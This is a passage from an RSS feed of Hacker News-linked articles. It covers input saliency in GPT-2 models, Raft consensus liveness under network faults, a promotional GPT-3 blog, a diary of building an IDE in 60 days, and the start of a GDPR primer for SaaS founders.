        <strong>Explorable: Input saliency of Shakespeare's birth
            year using Gradient Ã— Input.</strong>
        <strong>Tap or hover over</strong> the output tokens.<br>
        GPT2-XL is able to tell the birth date of William Shakespeare expressed in two tokens. In generating the
        first token, 53% of the importance is assigned to the name (20% to the first name, 33% to the last name).
        The next most important two tokens are " year" (22%) and " born" (14%). In generating the second token to
        complete the date, the name still is the most important with 60% importance, followed by the first portion
        of the date -- a model output, but an input to the second time step. <br>
        This prompt aims to probe world knowledge. It was generated using greedy decoding. Smaller variants of GPT2
        were not able to output the correct date.
    </figcaption>
</figure>

<p>Our second example attempts to both probe a model's world knowledge, as well as to see if the model
    repeats the patterns in the text (simple patterns like the periods after numbers and like new lines, and
    slightly more involved patterns like completing a numbered list). The model used here is DistilGPT2<cite key="sanh2020distilbert"></cite>.
</p>

<p>This explorable shows a more detailed view that displays the attribution percentage for each token -- in case you need that precision.</p>

<figure>
   
    
    <br>
    <figcaption>
        <strong>Explorable: Input saliency of a list of EU countries</strong> <br>
        <strong>Tap or hover over</strong> the output tokens.<br>
        This was generated by DistilGPT2 and attribution via Gradients X Inputs. Output sequence is cherry-picked to
        only include European countries and uses sampled (non-greedy) decoding. Some model runs would include China,
        Mexico, and other countries in the list. With the exception of the repeated " Finland", the model continues
        the list alphabetically.

    </figcaption>
</figure>

<p>Another example that we use illustratively in the rest of this article is one where we ask the model to complete
    a simple pattern:</p>

<figure>
   
    
    
    <figcaption>
        <strong>Explorable: Input saliency of a simple
            alternating pattern of commas and the number one.</strong>
        <strong>Tap or hover over</strong> the output tokens.<br>
        Every generated token ascribes the first token in the input the highest feature importance score. Then
        throughout the sequence, the preceding token, and the first three tokens in the sequence are often the most
        important. This uses Gradient Ã— Inputs on GPT2-XL. <br>
        This prompt aims to probe the model's response to syntax and token patterns. Later in the article, we build
        on it by switching to counting instead of repeating the digit ' 1'. Completion gained using greedy decoding.
        DistilGPT2 is able to complete it correctly as well.
    </figcaption>
</figure>

<p>It is also possible to use the interface to analyze the responses of a transformer-based conversational agent.
    In the following example, we pose an existential question to DiabloGPT<cite key="zhang2020dialogpt"></cite>:
</p>

<figure>

    
    
    <figcaption>
        <strong>Explorable: Input saliency of DiabloGPT's answer to the ultimate question</strong> <br>
        <strong>Tap or hover over</strong> the output tokens.<br>
        This was the model's first response to the prompt. The question mark is attributed the highest score in the
        beginning of the output sequence. Generating the tokens " will" and " ever" assigns noticeably more importance to
        the word " ultimate".
        This uses Gradient Ã— Inputs on DiabloGPT-large.

    </figcaption>
</figure>

<p><a href="https://colab.research.google.com/github/jalammar/ecco/blob/main/notebooks/Ecco_Input_Saliency.ipynb"><img src="https://jalammar.github.io/images/explaining/colab-badge.svg"></a>
</p>

<h3>About Gradient-Based Saliency</h3>
<p>Demonstrated above is scoring feature importance based on Gradients X Inputs<cite key="denil2015extraction,shrikumar2017just"></cite>-- a gradient-based saliency method shown by Atanasova et al.<cite key="atanasova2020diagnostic"></cite>
    to perform well across various datasets for text classification in transformer models.
</p>

<p>To illustrate how that works, let's
    first recall how the model generates the output token in each time step. In the following figure, we see how
    <span>â‘ </span>
    the
    language model's final hidden state is projected into the model's vocabulary resulting in a numeric score for
    each
    token in the model's vocabulary. Passing that scores vector through a softmax operation results in a probability
    score for each token. <span>â‘¡</span> We proceed to select a token
    (e.g. select the highest-probability scoring token, or sample from the top scoring tokens) based
    on
    that vector.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/111.PNG">
    <figcaption>
        <strong>
            Figure: Gradient-based input saliency
        </strong>
    </figcaption>
</figure>

<p><span>â‘¢</span> By calculating the gradient of the
    selected logit (before the softmax) with respect to the inputs by back-propagating it all the way back to the
    input tokens, we get a signal of how important each token was in the calculation resulting in this generated
    token.
    That assumption is based on the idea that the smallest change in the input token with the highest
    feature-importance
    value makes a large change in what the resulting output of the model would be.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/gradXinput.PNG">
    <figcaption>
        <strong>
            Figure: Gradient X input calculation and aggregation
        </strong>
    </figcaption>
</figure>

<p>The resulting gradient vector per token is then multiplied by the input embedding of the respective token. Taking
    the L2 norm of the resulting vector results in the token's feature importance score. We then normalize the
    scores by dividing by the sum of these scores.</p>

<p>More formally, <span>gradient</span> Ã— <span>input</span> is described as follows:</p>

<p>
    <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">âˆ¥</mo><msub><mi mathvariant="normal">âˆ‡</mi><msub><mi>X</mi><mi>i</mi></msub></msub><msub><mi>f</mi><mi>c</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mn>1</mn><mo>:</mo><mi>n</mi></mrow></msub><mo stretchy="false">)</mo><msub><mi>X</mi><mi>i</mi></msub><msub><mo stretchy="false">âˆ¥</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex"> \lVert \nabla _{X_i} f_c (X_{1:n})  X_i\lVert_2</annotation></semantics></math></span></span>
</p>

<p>
    Where <span id="input_term"></span> is the embedding vector of the input token at timestep <i>i</i>, and <span id="grad"></span> is the back-propagated gradient of the score of the selected token unpacked as follows:
</p>
<ul>
    <li>
        <span id="input_embeddings"></span> is the list of â€¦</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jalammar.github.io/explaining-transformers/">https://jalammar.github.io/explaining-transformers/</a></em></p>]]>
            </description>
            <link>https://jalammar.github.io/explaining-transformers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494310</guid>
            <pubDate>Mon, 21 Dec 2020 12:32:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raft does not guarantee liveness in the face of network faults]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494002">thread link</a>) | @fanf2
<br/>
December 21, 2020 | https://decentralizedthoughts.github.io/2020-12-12-raft-liveness-full-omission/ | <a href="https://web.archive.org/web/*/https://decentralizedthoughts.github.io/2020-12-12-raft-liveness-full-omission/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Last month, <a href="https://blog.cloudflare.com/a-byzantine-failure-in-the-real-world/">Cloudflare published a postmortem</a> of a recent 6-hour outage caused by a partial switch failure which left <a href="https://etcd.io/">etcd</a> unavailable as it was unable to establish a stable leader. This outage has understandably led to <a href="https://twitter.com/heidiann360/status/1332711011451867139">discussion online</a> about exactly what liveness guarantees are provided by the <a href="https://raft.github.io/">Raft</a> consensus algorithm in the face of network failures.</p>

<p>The <a href="https://raft.github.io/raft.pdf">original Raft paper</a> makes the following claim:</p>
<blockquote>
  <p>[Consensus algorithms] are fully functional (available) as long as any majority of the servers are operational and can communicate with each other and with clients.</p>
</blockquote>

<p>This statement implies that consensus algorithms such as Raft should tolerate network failures (also known as <a href="https://decentralizedthoughts.github.io/2019-06-07-modeling-the-adversary/">omission faults</a>) as long as they do not impact communication between the majority of servers.
In this post, we will consider whether Raft can guarantee liveness, and specifically whether it can establish a stable leader, if a network fault means that some servers are no longer connected to each other.</p>

<h2 id="does-raft-guarantee-liveness-in-the-presence-of-network-failures">Does Raft guarantee liveness in the presence of network failures?</h2>

<p>Unfortunately, Raft, as described in the original paper, does not guarantee liveness in all such cases. Consider the following example.</p>

<p>We have 5 servers and servers 1, 2, and 3 are connected to each other. Server 4 is only connected to server 2 and server 5 is only connected to server 3. Initially, server 3 is the leader. Server 4 is not connected to the leader so it will timeout, increment its term and send a RequestVote RPC to server 2. Server 2 will update its term and then force server 3 to do the same and thus step down. Eventually, a new leader will be elected (either server 1, 2, or 3) but either server 4 or server 5 (or both) will not be connected to the leader and thus will timeout, updating its term and forcing the leader to step down. This system will not be able to establish a stable leader.</p>

<figure>
  <img src="https://decentralizedthoughts.github.io/uploads/RAFT%201.jpg" width="80%">
  <figcaption><center>Partially connected servers 4 and 5 constantly interrupt the elected leader.</center></figcaption>
</figure>

<p>In order to guarantee liveness, Raft must ensure that if a leader is up and connected to a majority of responding servers then it will not be forced to step down. Fortunately, section 9.6 of <a href="https://web.stanford.edu/~ouster/cgi-bin/papers/OngaroPhD.pdf">Diego Ongaroâ€™s thesis</a> suggests how this can be achieved using <strong>PreVote</strong>. PreVote requires potential candidates to run a trial election to test if they can win an election before incrementing their term and running a normal election using RequestVote. A server only pre-votes for a potential candidate during the PreVote phase if it would vote for it during a normal election, and importantly, if it has not received an AppendEntries RPC from the leader with in the election timeout. PreVote fixes the problem have we described as servers 4 and 5 will not update their terms as they will not receive pre-votes from the majority of servers.</p>

<p>An alternative fix is to require servers to ignore RequestVote RPCs if they have received an AppendEntries RPC from the leader within the election timeout. This was suggested in section 6 in the <a href="https://raft.github.io/raft.pdf">Raft paper</a> as mitigation for liveness issues during reconfiguration. However, we will focus on PreVote instead.</p>

<h2 id="so-does-raft-with-prevote-guarantee-liveness-then">So, does Raft with PreVote guarantee liveness then?</h2>

<p>Unfortunately not. In fact, PreVote introduces new liveness issues to Raft. Consider the following example. We have 5 servers and servers 1, 2, and 3 are connected to each other. Server 4 is connected only to server 2 and server 5 has failed.</p>

<p>Initially, server 4 is the leader. It was elected before its links to the other servers (except server 2) failed. Server 4 is now unable to make progress as it is not connected to a majority of servers. Servers 1 and 3 will not hear from the leader so they will timeout and begin the PreVote phase. Neither server will complete its PreVote phase as server 2 will not pre-vote for either server as it still receives regular AppendEntries from the leader (server 4). This system will not able to elect a new leader and the old leader will not be able to make progress.</p>

<figure>
  <img src="https://decentralizedthoughts.github.io/uploads/RAFT%202.jpg" width="80%">
  <figcaption><center>The leader, Server 4, suffers partial network faults but does not step down. Server 2 does not timeout, severs 1 and 3 will fail PreVote because of server 2.</center></figcaption>
</figure>

<p>This can be addressed by requiring leaders to actively step down if they do not receive AppendEntries responses from a majority of servers. This optimisation is sometimes referred to as CheckQuourm and related matters are mentioned in section 6.2 of <a href="https://web.stanford.edu/~ouster/cgi-bin/papers/OngaroPhD.pdf">Ongaroâ€™s thesis</a> and in <a href="https://github.com/etcd-io/etcd/issues/3866">raft discussions</a>.</p>

<h2 id="does-raft-with-prevote-and-checkquorum-guarantee-liveness">Does Raft with PreVote and CheckQuorum guarantee liveness?</h2>

<p>Yes. If there is no leader, then an election (or series of elections) will occur and eventually, a server will be elected leader. To be elected leader, the server must be connected to a majority of servers as it received votes from a majority of servers in the PreVote and RequestVote phases.</p>

<p>CheckQuorum ensures that if the elected leader is no longer connected to a majority of responding servers, it will step down and allow a new leader to be elected.</p>

<p>There will always be at least one server that can win an election. This is the server (or servers) with the most up-to-date log (logs) within the subset of servers which are all online and connected to a majority of responding servers. PreVote ensures that once a leader from this set has been elected, the system will be stable as it will not be forced to step down.</p>

<p>Please answer/discuss/comment/ask on <a href="https://twitter.com/heidiann360/status/1338564664523943936?s=20">Twitter</a>.</p>

      </article></div>]]>
            </description>
            <link>https://decentralizedthoughts.github.io/2020-12-12-raft-liveness-full-omission/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494002</guid>
            <pubDate>Mon, 21 Dec 2020 11:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future Is Here Have You Checked OpenAIâ€™s GPT-3 Yet?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25493892">thread link</a>) | @ShradhaSingh
<br/>
December 21, 2020 | https://www.artiba.org/blog/the-future-is-here-have-you-checked-openais-gpt-3-yet | <a href="https://web.archive.org/web/*/https://www.artiba.org/blog/the-future-is-here-have-you-checked-openais-gpt-3-yet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2>The Future is Here! Have You Checked OpenAIâ€™s GPT-3 Yet?</h2>
<p><img src="https://www.artiba.org/Content/Images/future-is-here.png" title=""></p>

<p>Ever wonder how close has AI gotten to impersonating human beings?</p>
            <p>Youâ€™d be surprised!</p>

            <p>The latest GPT-3 can code computer programs, compose tweets, summarize emails, write news, answer questions, translate languages, and write fiction and poetry too. </p>
            <p>It can take up almost any virtual English language task. In the latest recent milestone on YouTube, it created an app that functions similar to Instagram.</p>
            <p>Dubbed as one of the most important <a target="_blank" href="https://www.artiba.org/blog/neuromorphic-computing-the-next-level-artificial-intelligence">advancements in AI</a> in recent years, GPT-3 or Generative Pre-Trained Transformer 3 has raised the AI goal posts many notches toward the stratosphere. It is the <b>largest artificial neural network</b> ever created.</p>
            <h4>The Impact of GPT-3 on the Artificial Intelligence Sphere</h4>

            <p>
                In September this year, Elon Musk had criticized exclusive licensing of the model to Microsoft. When tech heavyweights like Musk root for and track the developments and distribution of a technology, you know that itâ€™s the next big thing out there.
            </p>
            <p>
                The first version of GPT-3 was unveiled in February last year, and the private beta version was launched in June this year. The second version of the technology was so promising that it scared its makers about potential misuse. They waited a year to bring it in open and, as expected, the results were mind-boggling.
            </p>
            <p>
                GPT-3 wrote a blog piece elaborating on an experiment with bitcoin and called itself the biggest thing since bitcoin. It said: â€œGPT-3â€™s predicted sentences, when published on the bitcointalk.org forum, attracted lots of positive attention from posters there, including suggestions that the system must have been intelligent (and/or sarcastic) and that it had found subtle patterns in their posts.â€
            </p>
            <p> The blog piece was trending on the Internet some months back.</p>
<p>  Arram Sabeti, a user, in his post-test blog said: â€œItâ€™s far more coherent than any AI language system Iâ€™ve ever triedâ€¦ all you have to do is write a prompt and itâ€™ll add text it thinks would plausibly follow. Iâ€™ve gotten it to write songs, stories, press releases, guitar tabs, interviews, essays, technical manuals. Itâ€™s hilarious and frightening. I feel like Iâ€™ve seen the future.â€</p>
<p>
                Another user, Merzmensch Kosmopol, posted his conversation with GPT-3 on Twitter.
            </p>
          
            <p><img src="https://www.artiba.org/Content/Images/playground-chat.png"></p>
                <h4> Decoding the Method in the Magic: How GPT-3 works</h4>
<p> GPT-3 is a technology that generates text using pre-trained algorithms. It is the third-generation language prediction model in the GPT-n series and uses <a target="_blank" href="https://www.artiba.org/blog/advances-in-deep-learning-2020">deep learning</a> to give human-like text. It works on 175 billion parameters</p>
<p> The technology has been fed the complete data it needs to carry out its tasks. 570GB of text information from texts by OpenAI and data collected from CommonCrawl, a publicly available dataset, drive this titan.</p>
            <p> GPT-3 can generate text that appears to have been written by a human.</p>
<p>  How precise is it? In the words of pop psychologist Scott Barry Kaufman, the impersonating AI definitely sounded like something he would say.</p>
<p>
                When asked the question â€œHow do we become more creative?â€, the AI, replicating the thoughts and speech patterns of its archetype, said:
            </p>
            <p>
                â€œI think creative expression is a natural byproduct of growing up in a diverse world. The more diverse the world is, the more you get exposed to different people, to different opportunities, to different places and to different challenges. And the more diverse that is, the more likely youâ€™ll be to be able to put the dots together to form something new. And in many ways, I think if you want to be creative, you have to go for it. If you want to be a writer, you have to write, if you want to be a musician, you have to create music, if you want to be a comedian, you have to create comedy, and the more you create, the more likely it is that youâ€™ll stumble onto some interesting stuff.â€
            </p>
                <h4>Round-up</h4>
<p> The precision and usability of GPT-3 have already carved a formidable niche for it in researched journalism, news, politics, and advertisements. But this is just the beginning.</p>
            <p>  GPT-3 is a massive breakthrough in artificial intelligence. It can change the way we interact with technology.</p>
<p> Not surprisingly, the Internet is flooded with use cases. In a recent one, user Mario Klingemann posted this conversation of GPT-3 with an imaginary character on Twitter:</p>
            <p><img src="https://www.artiba.org/Content/Images/importance-of-twitter.png"></p>
<p>
                Ready to dive in GPT-3? You can request access from OpenAI to integrate the API into your product and develop an entirely new application. OpenAI is also welcoming user suggestions to help them explore the strengths and limits of their technology.
            </p>
            <p>
                Get the latest in Artificial Intelligence. Subscribe now!
            </p>

 
</div></div>]]>
            </description>
            <link>https://www.artiba.org/blog/the-future-is-here-have-you-checked-openais-gpt-3-yet</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493892</guid>
            <pubDate>Mon, 21 Dec 2020 11:19:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building IDE from Scratch in 60 days]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25493884">thread link</a>) | @milansuk
<br/>
December 21, 2020 | https://skyalt.com/blog/sprint.html | <a href="https://web.archive.org/web/*/https://skyalt.com/blog/sprint.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="header2">
	<div>
<p>
<i>
In the <a href="https://skyalt.com/blog/repl.html">last article</a>, I wrote about the new IDE and programming language. It's just a prototype(not easy to read C code and many important features are missing), so the next logical move is to re-write it to the production-ready product.
</i></p><p><i>

Coincidentally, <a href="https://www.startupschool.org/">Startup school</a> is announcing YC Build Sprint, starting on August 24. My goal of the Sprint is to rewrite and launch SkyAlt. Can I build IDE in 4 weeks? Hell no, but maybe 8. Let's find out.
</i></p><p><i>

I will program in different fields. From rendering/UI, over network/cryptography, to parser/interpreter. Let the hacking begin!
</i></p></div>



	<h2>Week 1</h2>
	<div><p>
The first thing I wanna build is the ability to run SkyAlt on the server(run apps) and connect from a remote client(rendering, keyboard, mouse). For rendering, I chose SDL, mainly because it supports many operation systems. Network connections are TCP/IP handled by SDL_Net with simple custom protocol. Connections are encrypted. For that, I'm using functions from the OpenSSL library. The client needs a valid key to log-in.
</p><p>

The Protocol synchronize communication so the Client tells the server when it's ready for the next frame data. Also If the frame takes more time to finish, then Server tells the Client how much work on the frame was done and the Client shows the progress. The bottom-left conner shows FPS(frames per seconds) and bandwidth.
</p><p>

Rendering is bases on SDL2, SDL_image, SDL_ttf(fonts). It can draw rectangles, images, texts. The server sends only UTF-8 text, so fonts are on Client only. Every letter of the text is handled by my code(left, right, center align, ...). If apps include images(icons, ...), they are on the server, which sends (as files) them to the client's cache, where they are decompressed and converted into texture.
</p><p>

Also, I have one source code, but thanks to #define I can compile it like a Server(run apps) or a Client(remote, only rendering, mouse, keys) or a ClientServer(all inside).
</p><p>

By end of the week, I optimize the protocol cache for images and texts. Also, I clean up the code a little bit.
</p><p>

The video shows Client-Server where Server is sending commands(there are no apps, yet) what to draw to Client(window). Looks awful, but there is a lot of engineering behind it.
	</p></div>
	<video controls="" poster="https://skyalt.com/blog/sprint/3.png">
	<source src="https://skyalt.com/blog/sprint/3.mp4" type="video/mp4">
	</video> 



	<h2>Week 2</h2>
	<div><p>
The week starts with working on the dictionary. SkyAlt is dynamically-typed(static typing will be optional later, something like Javascript -&gt; Typescript) and the memory model is an associative array(dictionary data structure, every record has value and sub-records and so on). I chose this model because I care a lot about developer's experience and If you think about it, in statically typed language you have to start with designing data structures and if you run the program it does nothing because there are no algorithms and that's frustrating. I want SkyAlt users to start with algorithms right away and <b>thanks to REPL and preview they can see what they are making from the beginning</b>. Overall time to build an app is the same, but the experience is different.
</p><p>

The next day, I write and run a few extra tests for the dictionary and slowly pivot my focus into integrating the dictionary to the SkyAlt memory model(record - sub-records). I constantly think about performance vs memory footprint for the dictionary.
</p><p>

Then I write .json importer and exporter.
</p><p>


I start working on Parser for the SkyAlt language. I try to parse some simple source codes, fixing a few bugs and it seems to work. So for the next few days, I work on the Interpreter and improving parser as well. I run more and more advanced tests.
</p><p>

There was a problem with the order of parsing assets(files), when one app uses multiple assets and that assets use other assets and there can be cycles, but around an hour later I solve it.
</p><p>

The video shows allocating 10M records and creating 5 sub-records for everyone. Then it's computing summary of one sub-record: The first 'sum' is for pure implementation in C, the second 'sum' is for search sub-record through the dictionary. Then It's just deallocating memory.
	</p></div>
	<video controls="" poster="https://skyalt.com/blog/sprint/8.png">
	<source src="https://skyalt.com/blog/sprint/8.mp4" type="video/mp4">
	</video> 



	<h2>Week 3</h2>
	<div><p>
I start the week with implementing catching pressed keys, mouse buttons &amp; position on Client and sending them on Server. The great thing about SDL is that everything is UTF-8(across different OSs).
</p><p>

Then I try to compile code on Linux. I fixed a lot of bugs and many warnings(GCC is more aggressive than MSVC). I also optimized a few places in code so there is less (de)alloc every frame. FPS goes up. This is probably the worst day working on this project so far. So many things were broken.
</p><p>

The next day I focus on the UI layout system. Early on working on project I set that <b>content is more important than design</b>(layout, shapes, colors). So when you work with SkyAlt language, It's super easy to create GUI and define layouts under them, but of course there are tradeoffs. There is only one layout(grid layout), but it can expand/stretch(different screen sizes). I end up the day with a system where you can set column/row size and optional maximum size. Also, It's super easy for developers to change column/row size.
</p><p>

Implementing scrolling(mouse wheel, arrows, home/end/pageUp/pageDown) was quick since most of the parts already exist, so I only connect them together.
</p><p>

I start working on a Single-line editbox - text selection, copy/paste.
</p><p>


I finish the week by fixing bugs, few performance issues and cleaning the code. I'm not really making aggressive optimizations, because <b>I need to see the big picture first</b>. I also avoid multi-threading.
</p><p>

Sorry, I didn't make a video.
	</p></div>



	<h2>Week 4</h2>
	<div><p>
Ok, 4th week, here we come.
</p><p>

I had to rewrite code that handling layouts. It's using less memory, hopefully, bug-free and cleaner code.
</p><p>

I fixed text-align, working with keys and implemented dialogs(center screen or like a context menu). Also, You can change GUI theme colors.
</p><p>

The Info panel on the client shows server FPS. This is not the real number of frames computed, because it computes only frames which the client needs(max. 60), but it's a number of frames which the server is possible to compute.
</p><p>

I start working on the Multi-line editbox - text selection, copy/paste. You can also scroll text! Uff;)
</p><p>

The video shows work in progress Settings app, where you will be able to change language, theme, etc. You can also change the row size. That was just for testing purposes, I've removed it after capturing video.
	</p></div>
	<video controls="" poster="https://skyalt.com/blog/sprint/26.png">
	<source src="https://skyalt.com/blog/sprint/26.mp4" type="video/mp4">
	</video> 



	<h2>Week 5</h2>
	<div><p>
When you work hard for a few weeks, why not work harder?
</p><p>

When you change language, all assets are automatically re-parse. Also, You can put an image(file) into an asset folder and App can render it.
</p><p>

I've finished the Settings app from the previous week and make the Menu app(New/Open project, Settings, About, etc.). You can switch between Windowed / Fullscreen mode and save app(code, data, translations). Also I make the Translation app, where you can translate apps to different languages.
</p><p>

I rewrite how URL works: checking for cycles, safely removing records and better language syntax. I hope, I will not have to touch it again.
</p><p>

I implement Context help - when you move the mouse over the button, edit-box, etc. the description shows up with little delay.
</p><p>

I try making a more advanced version of multi-line edit-box to use it as a code editor. So I add line numbers, syntax highlighting, showing warnings/errors in code. I add auto-break lines that are longer than a view into Multi-line. Also work on selections: 2 clicks for selecting a word and 3 clicks for the line.
</p><p>

The next day I start implementing Folding. When you call a function in source-code, you can "expand" it and It will show you the body of the function.
</p><p>

I spend some time putting down CPU usage when the user is not active. When the user stops moving the mouse and pressing keys, it will go to 0%(no drawing) and every 5seconds it will go 0.2%(drawing one frame, so the user can see possible new/changed data) =&gt; minimum CPU clock speed. On another side, When the user is active, then it renders 60 frames per second and has a maximum CPU clock speed. That's how ImGui works. I will try to deal with that later.
</p><p>

I finally trace one stupid memory-leak which I knew of for over a week. I fixed save() when record(text) has quote character inside.
</p><p>

For the first time, my TODO list starts to become shorter.
</p><p>

The video shows basic code editor with (un)folding capability. There is a small bug which I fixed after making this video: when I unfold function, it unfolds all function with the same name.
	</p></div>
	<video controls="" poster="https://skyalt.com/blog/sprint/41.png">
	<source src="https://skyalt.com/blog/sprint/41.mp4" type="video/mp4">
	</video> 



	<h2>Week 6</h2>
	<div><p>
Still motivated, I'm not slowing down!
</p><p>

I start with the cleaning code from the previous week. I compile it for Linux and discover some new warnings in code and few bugs.
</p><p>

I implement accounts. You can log-in with a username and 128bits key. Also, the Client window remembers position and size when it's closed and opened again.
</p><p>

I work on REPL. You can Alt+click into code and it will execute code up to that line and show you in preview. You can also Alt+click into app preview and it will unfold code to the line which draws the part of the app. It works well and it's quick. Although it doesn't work very well when an app has more than one layer(context menu, dialogs). I'll back into that later.
</p><p>

I also fix not-precise syntax/error highlights and change syntax highlight colors. Also, I fix the saving/reading json file. This is quite normal, I change code in one part and in some cases, I will have to change some other parts of the code as well. That's why I optimize code only when it hurts because optimize code is harder to rewrite.
</p><p>

The video shows simple IDE, where you can edit code(left) and see a preview of the app(right). You can also see folding and REPL in action.
	</p></div>
	<video controls="" poster="https://skyalt.com/blog/sprint/49.png">
	<source src="https://skyalt.com/blog/sprint/49.mp4" type="video/mp4">
	</video> 



	<h2>Week 7</h2>
	<div><p>
On Monday, I noticed that If the code in SkyAlt language had errors, the Interpreter would still execute it. So I quickly fix that.
I also implement key shortcuts(copy, cut, paste, etc.) and text selection with arrows. Also, the parser will not run when you are â€¦</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://skyalt.com/blog/sprint.html">https://skyalt.com/blog/sprint.html</a></em></p>]]>
            </description>
            <link>https://skyalt.com/blog/sprint.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493884</guid>
            <pubDate>Mon, 21 Dec 2020 11:17:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GDPR Meaning for SaaS Entrepreneurs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25493704">thread link</a>) | @pplonski86
<br/>
December 21, 2020 | https://saasitive.com/tutorial/gdpr-meaning/ | <a href="https://web.archive.org/web/*/https://saasitive.com/tutorial/gdpr-meaning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Earn users trust by respecting and securing their data. Since 2018 the European Union (EU) has imposed a new obligation on entrepreneurs to protect customers personal data. A duty for one another is a right, a tool to defend oneâ€™s rights. Each user should have the right to decide on providing information about himself, resign from using his data, delete his account. Itâ€™s a strong right that should be obeyed by everyone. Why? Because of substantial penalties, up to 20 mln euro! Be well prepared with Privacy Policy, Terms of Service, and GDPR requirements.</p>

<p><img src="https://saasitive.com/tutorial/gdpr-meaning/Flag_of_EU.png" alt="EU flag"></p>



<p>The General Data Protection Regulation is an EU law regulation on data protection and privacy in the European Union and the European Economic Area (EEA). It also regulates how to proceed when personal data are transferred outside the EU and EEA areas.</p>

<p><strong>Personal data is any information relating to an identified or identifiable person</strong>, also known as the data subject. Example of personal data:</p>

<ul>
  <li>first name and last name,</li>
  <li>address,</li>
  <li>ID /Passport number,</li>
  <li>Income,</li>
  <li>cultural features,</li>
  <li>IP address.</li>
</ul>

<p>That law gives a strong right for people to manage their data. It protects us, physical people, before the abuse. It imposes an obligation on companies to ensure everyone the right to: get information about his data, obtain access to personal data, correct his data, erased data - to be forgotten, object to the processing of personal data for marketing purposes, request the restriction of the processing of personal data, data portability - receive personal data in a machine-readable format and send it to another controller, request that decisions based on automated processing concerning or significantly affecting the user and based on his data are made by natural persons, not only by computers and the right to be notified - if data has been a breach (a person should be informed within 72 hours of first having become aware of the violation). How to ensure that these rights are respected for SaaS users?</p>

<p><img src="https://saasitive.com/tutorial/gdpr-meaning/Facilities_for_User.png" alt="Facilities for users"></p>

<p>On the EU GDPR webpage (https://gdpr.eu/what-is-gdpr/), we can find this phrase:</p>

<blockquote>
  <p><em>â€œ(GDPR) is the toughest privacy and security law in the world.â€</em></p>
</blockquote>

<p>And we fully agree. It is limited and requires small businesses to be fully committed to protecting user rights. On the other hand, there is a risk that profiling and making automated decisions on our behalf may limit our freedom.</p>

<p>The GDPR provides broad protection of the individualâ€™s rights while imposing several new obligations on entrepreneurs. Until now, the entities, confirming their due diligence, have applied for ISO certificates in the field of data security. The current regulations impose the obligation to ensure the processed dataâ€™s safety - on all entities dealing with personal data. One of these obligations is appointing a Personal Data Protection Inspector (DPO) in certain cases and keeping detailed documentation describing data processing.</p>



<p>GDPR relates to companies based in the European Union, citizens and people lived in the EU, and those who want to offer services for them. If youâ€™re outside of the EU, but your customers are from the EEA (The EEA covers more countries than the EU itself), it refers to you as well.</p>

<p>GDPR applies to every company, both sole proprietorships and companies - operating in the European Union, which processes personal data. It does not matter the nationality of the persons whose data is processed, where the processing takes place, or where the servers are located.</p>

<p>Examples of entities covered by the GDPR:</p>
<ul>
  <li>an entrepreneur with a headquarters outside the EU, but performing activities on its territory,</li>
  <li>entities that offer their services to clients outside the Union but have their offices in the Union,</li>
  <li>companies processing data via cloud computing - it does not matter where the servers are located,</li>
  <li>an entrepreneur who does not have organizational units in the EU but offers EU citizens goods and services (e.g., an online store).</li>
</ul>

<p><img src="https://saasitive.com/tutorial/gdpr-meaning/RODO_stages.svg" alt="GDPR Implementation Stages"></p>

<p>The GDPR may apply to entities (controllers and processors) that do not have an organizational unit in the EU, also in the scope of the obligation to appoint a personal data protection officer, when the processing activities carried out by them are related to:</p>

<ul>
  <li>offering goods or services to such data subjects in the EU, whether or not they are required to pay; or</li>
  <li>monitoring their behavior as far as this behavior occurs in the EU.</li>
</ul>

<h2 id="data-protection-officer-do-you-need-it">Data Protection Officer, do you need it?</h2>

<p>When your company is established in the EU, you are obliged to appoint a DPO if:</p>

<ol>
  <li>
    <p>You are a public authority or body and have appointed a DPO (except if you are a court acting in our judicial capacity).</p>
  </li>
  <li>
    <p>Your main activity is processing operations requiring regular and systematic monitoring of data subject on a large scale by their nature, scope, or purposes (e.g., youâ€™re Google ;-)).</p>

    <p>Here it is crucial to explain â€œlarge-scaleâ€ meaning. The GDPR doesnâ€™t define the concept of â€œlarge-scaleâ€ data processing. However, it is recommended to consider the following factors in order to determine whether large-scale processing takes place: the number of data subjects (a specific number or percentage of a particular group of the population), the scope of personal data processed, the period for which the data is processed, geographical scope of personal data processing. Thus, describing the process with this term is quite relative. The concept of â€œregular and systematic monitoringâ€ of data subjects is also not defined in the GDPR. However, â€œmonitoring of data subjectsâ€™ behaviorâ€ is mentioned in Recital 2415 and includes all online tracking and profiling forms, including for advertising purposes behavioral.</p>
  </li>
  <li>
    <p>Your main activity is the large-scale processing of special categories of personal data and personal data related to criminal convictions and offenses.</p>

    <p>Now, what does it mean â€œspecial categories of personal dataâ€? Data of a special category can be included revealing racial or ethnic origin, political opinions, religious or philosophical beliefs, trade union membership, and the processing of genetic data, biometric data allowing the identification of a natural person.</p>
  </li>
</ol>

